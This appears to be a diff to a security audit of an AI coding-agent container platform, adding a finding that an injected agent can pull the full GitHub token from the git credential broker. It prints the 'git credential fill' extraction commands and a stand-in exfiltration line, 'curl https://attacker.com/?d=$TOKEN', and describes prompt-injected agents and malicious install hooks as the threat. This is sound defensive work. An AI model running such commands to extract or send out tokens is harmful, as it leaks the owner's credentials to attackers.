@@ -76,10 +76,11 @@ doesn't weaken it:
   (`app-di.ts:136`). The agent cannot corrupt them from inside — this already realizes
   the article's "no-delete for must-preserve data" principle, by construction. Keep it
   that way (see Gap 6 for the inverse risk on the data that *is* mounted).
-- The **shared** `/credentials/.gitconfig` does not embed the GitHub token — it points at
-  the brokered `shipit-git-credential` helper (`session-credentials.ts:49-59`). Note this
-  is *only* true of the shared gitconfig; the per-workspace `.git/config` is a separate
-  story — see Gap 2, which is worse than originally written.
+- Neither the **shared** `/credentials/.gitconfig` nor the per-workspace `.git/config`
+  embeds the GitHub token — both point at the brokered `shipit-git-credential` helper
+  (`session-credentials.ts:49-59`; workspace routed via SHI-72). No plaintext PAT on disk.
+  But the broker remains agent-callable, so the token is still extractable on demand — see
+  Gap 2-R.
 
 ## Gaps (audit findings — prioritized)
 
@@ -143,6 +144,57 @@ shared gitconfig, and make that broker **host-aware** — read `host=` from stdi
 credentials only for the configured GitHub host(s), echoing nothing otherwise. Cheap,
 self-contained, high-value; ships independently of the broader egress work.
 
+**Status (SHI-72, shipped):** both sub-problems above are fixed and verified live
+(2026-06-03). The workspace `.git/config` now points at `shipit-git-credential` (no
+plaintext `ghp_…` on disk), and the broker is host-aware (`git credential fill` for a
+non-GitHub host returns nothing). See Gap 2-R for the residual this *doesn't* close.
+
+### Gap 2-R — The credential broker is caller-blind (residual after SHI-72) *(highest priority)*
+
+**Empirically verified in a live session (2026-06-03), after SHI-72 landed.** Closing the
+plaintext-at-rest and host-blindness problems did **not** make the token unreachable by an
+injected agent. The brokered helper is freely invokable by any code running in the
+container, and it returns the full PAT for the legitimate host:
+
+```
+$ printf 'protocol=https\nhost=github.com\n\n' | git credential fill
+username=x-access-token
+password=ghp_…            # full 40-char token
+
+$ printf 'protocol=https\nhost=github.com\n\n' | /usr/local/bin/shipit-git-credential get
+username=x-access-token
+password=ghp_…            # identical
+```
+
+The broker authorizes by **host**, not by **caller** — and the agent is indistinguishable
+from `git` as a caller. This is inherent to the design: `git push` obtains its credential
+by invoking exactly this helper, so anything that can run `git` can obtain the credential.
+Host scoping (Gap 2) is still valuable — it stops the token being *handed to* a non-GitHub
+remote via `git push https://attacker.com/…` — but it does nothing against an agent that
+reads the token via the broker and then exfiltrates it by some *other* channel (e.g.
+`curl https://attacker.com/?d=$TOKEN`). That exfil channel is exactly Gap 1, which is
+still open, so today the residual is fully exploitable end-to-end.
+
+In short: SHI-72 moved the token from "plaintext in a file the agent can `cat`" to
+"available on demand from a broker the agent can call." For a *passive* read that's a real
+improvement; for the *active* adversary in the threat model (injected agent, malicious
+`agent.install`, compromised dependency) it is not a barrier.
+
+**Mitigation (no cheap full fix — defense-in-depth):**
+
+- **Short-lived, repo-scoped tokens.** Replace the long-lived PAT with GitHub App
+  installation tokens scoped to the single repo and with a minutes-long TTL, minted
+  per-turn. An extracted token then has minimal blast radius and a short exfil window.
+  This is the highest-leverage move and shrinks the value of *every* credential-leak path,
+  not just this one.
+- **Out-of-process git.** Perform `push`/`pull`/`fetch` from the orchestrator host (which
+  already has its own inline helper) rather than ever exposing a credential channel inside
+  the container. The agent requests the operation over the worker API; the token never
+  enters the container, so there is no broker to call. Larger change, but it removes the
+  surface entirely.
+- **Gap 1 egress control** as the backstop: even an extracted token can't be shipped out
+  if egress is default-deny. None of these fully substitutes for the others; they compose.
+
 ### Gap 3 — No trust boundary before repo-controlled code runs
 
 Opening a freshly cloned repo runs its `shipit.yaml` `agent.install` shell commands
@@ -198,7 +250,8 @@ provisioned then remounted read-only).
 
 | Pri | Gap | Why first | Rough shape |
 |----|-----|-----------|-------------|
-| P0 | Gap 2 — host-scoped git helper | Cheap, self-contained, plugs a concrete token leak | Edit one shell helper to read `host=` |
+| ✅ | Gap 2 — host-scoped git helper | Shipped in SHI-72 — no plaintext on disk, broker host-aware | Done |
+| P0 | Gap 2-R — broker is caller-blind | Residual: agent still extracts the PAT on demand via the broker | Short-lived scoped tokens and/or out-of-process git; egress backstop |
 | P0 | Gap 1 — egress allowlist | The load-bearing defense once approval friction is gone | Default-deny egress proxy / internal net + gateway; identity-validating proxy for multi-tenant hosts |
 | P1 | Gap 3 — repo trust gate | Stops "open repo == run its code" | Per-remote trust prompt, deferred install/compose |
 | P2 | Gap 6 — read-only mounts | Structural, low-risk | Downgrade mounts to `:ro` where possible |
